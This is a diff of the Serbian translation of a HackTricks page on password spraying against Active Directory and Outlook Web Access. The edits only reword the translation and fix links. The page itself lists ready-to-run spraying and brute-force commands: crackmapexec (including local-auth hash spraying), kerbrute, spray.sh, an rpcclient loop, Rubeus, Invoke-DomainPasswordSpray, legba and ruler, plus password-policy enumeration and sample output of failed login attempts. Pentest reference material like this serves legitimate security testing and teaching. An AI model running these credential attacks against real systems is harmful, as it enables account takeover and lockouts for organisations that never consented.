@@ -4,28 +4,28 @@
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Drugi načini da podržite HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 ## **Password Spraying**
 
-Kada pronađete nekoliko **validnih korisničkih imena**, možete isprobati najčešće **šifre** (imajte na umu politiku šifre okruženja) sa svakim od otkrivenih korisnika.\
-Podrazumevano, **minimalna dužina šifre** je **7**.
+Kada pronađete nekoliko **validnih korisničkih imena** možete probati naj**češće lozinke** (imajte na umu politiku lozinke okruženja) sa svakim otkrivenim korisnikom.\
+Podrazumevano, **minimalna dužina lozinke** je **7**.
 
-Liste uobičajenih korisničkih imena takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Liste čestih korisničkih imena takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Imajte na umu da **možete zaključati neke naloge ako pokušate više pogrešnih šifri** (podrazumevano više od 10).
+Imajte na umu da **možete zaključati neke naloge ako pokušate više pogrešnih lozinki** (podrazumevano više od 10).
 
-### Dobijanje politike šifre
+### Dobijanje politike lozinke
 
-Ako imate neke korisničke podatke ili shell kao korisnik domena, možete **dobiti politiku šifre sa**:
+Ako imate neke korisničke podatke ili shell kao korisnik domena možete **dobiti politiku lozinke sa**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -42,9 +42,9 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Eksploatacija sa Linuxa (ili bilo kojeg drugog operativnog sistema)
+### Eksploatacija sa Linux-a (ili sa svih)
 
-* Korišćenje **crackmapexec** alata:
+* Korišćenje **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
@@ -58,18 +58,18 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-* [**prskanje**](https://github.com/Greenwolf/Spray) _**(možete naznačiti broj pokušaja kako biste izbjegli blokiranje):**_
+* [**prskanje**](https://github.com/Greenwolf/Spray) _**(možete naznačiti broj pokušaja da biste izbegli blokiranje):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-* Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČLJIVO, NEKADA NE FUNKCIONIŠE
+* Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NEPREPORUČENO, PONEKAD NE RADI
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-* Pomoću modula `scanner/smb/smb_login` u **Metasploitu**:
+* Sa modulom `scanner/smb/smb_login` u **Metasploit**-u:
 
-![](<../../.gitbook/assets/image (132) (1).png>)
+![](<../../.gitbook/assets/image (742).png>)
 
 * Korišćenjem **rpcclient**-a:
 ```bash
@@ -78,9 +78,9 @@ for u in $(cat users.txt); do
 rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-#### Sa Windowsa
+#### Sa Windows-a
 
-* Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja ima modul za brute force:
+* Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom sa modulom za brute force:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -88,11 +88,11 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* Sa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Po defaultu može generisati korisnike iz domena i dobiti politiku lozinke iz domena i ograničiti pokušaje prema njoj):
+* Sa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Može generisati korisnike sa domena po podrazumevanim vrednostima i dobiće pravila za lozinke sa domena i ograničiti pokušaje prema njima):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-* Sa [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) skriptom
+* Sa [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 ```
 Invoke-SprayEmptyPassword
 ```
@@ -102,11 +102,9 @@ Invoke-SprayEmptyPassword
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-{% endcode %}
-
 ## Outlook Web Access
 
-Postoje više alata za p**assword spraying outlook**.
+Postoje višestruki alati za **prskanje lozinki Outlook-a**.
 
 * Sa [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
 * sa [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
@@ -114,7 +112,7 @@ Postoje više alata za p**assword spraying outlook**.
 * Sa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 * Sa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lozinka / mala lista lozinki za spray.
+Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lozinka / mala lista lozinki za prskanje.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -137,7 +135,7 @@ Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lo
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
-* [www.blackhillsinfosec.com/?p=5296](www.blackhillsinfosec.com/?p=5296)
+* [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 * [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
 <details>
@@ -146,10 +144,10 @@ Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lo
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
